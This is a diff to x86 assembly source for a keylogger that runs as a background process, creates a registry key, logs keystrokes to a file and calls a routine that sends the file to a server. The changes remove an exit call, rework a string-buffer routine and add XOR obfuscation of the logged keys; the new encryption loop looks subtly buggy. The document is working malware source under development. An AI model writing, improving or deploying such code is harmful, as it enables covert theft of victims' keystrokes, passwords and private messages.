@@ -80,7 +80,6 @@ MAIN:
 		call				WriteLaunchTimeToFile
 		call				SendFileToServer
 		call				WinMain							;key logging starts here
-		INVOKE			ExitProcess, 0					;not needed, but just in case
 
 ;***************** Stay As Background Process ************************
 WinMain PROC 
@@ -190,12 +189,12 @@ WriteLaunchTimeToFile ENDP
 WriteByteByByteToBuffer PROC firstPart:DWORD, secondPart:DWORD, buffer:DWORD
 
 		INVOKE			GetStringLength, firstPart		;length of first string
-		mov				ebx, ecx 
+		push				ecx
 		mov				esi, firstPart							;pointer to first part
 		mov				edi, buffer								;pointer to buffer
 
 Loop1:
-		mov				al, BYTE PTR [esi + ecx]			;taking last char from end of  string
+		mov				eax, [esi + ecx]						;taking last char from end of string
 		mov				BYTE PTR [edi + ecx], al			;moving that char to the end of buffer
 		dec				ecx
 		cmp				ecx, 0FFFFFFFFh						;if less than 0
@@ -205,11 +204,12 @@ NextStep:
 		push				edi
 		INVOKE			GetStringLength, secondPart   ;length of second string
 		pop				edi
-		add				ebx, ecx								;length of buffer with two strings»»»
+		pop				ebx
+		add				ebx, ecx								;length of buffer with two strings
 		mov				esi, secondPart						;pointer to second part
 
 Loop2:
-		mov				al, BYTE PTR [esi + ecx]			;taking last char from end of string
+		mov				eax, [esi + ecx]						;taking last char from end of string
 		mov				BYTE PTR [edi + ebx], al			;moving that char to the end of buffer, which already contains first part
 		dec				ebx										;decrease counter and repeat
 		dec				ecx
@@ -259,16 +259,22 @@ CreateRegistryKey ENDP
 ;******************Write To File**************************************
 WriteToFile PROC msg:DWORD
 LOCAL	nBytes:DWORD
+LOCAL   encryptedString:DWORD
 
-		mov			edi, msg																	 ;get length of string to write in file
-		xor			ecx, ecx
-		xor			al, al				
-		not			ecx
-		cld
-		repne		scasb
-		not			ecx
+		INVOKE		GetStringLength, msg
+		mov			esi, msg
+		push			ecx
+
+Encrypt:
 		dec			ecx
-		INVOKE		WriteFile, fileDescriptor, [msg], ecx, ADDR nBytes, 0		;keys are logging one by one
+		movzx		eax, BYTE PTR [esi+ecx]
+		xor			eax, 50h
+		mov			[encryptedString+ecx], eax
+		test			ecx, ecx
+		jne			Encrypt
+		
+		pop			ecx
+		INVOKE		WriteFile, fileDescriptor, ADDR encryptedString, ecx, ADDR nBytes, 0	
 		ret
 
 WriteToFile ENDP
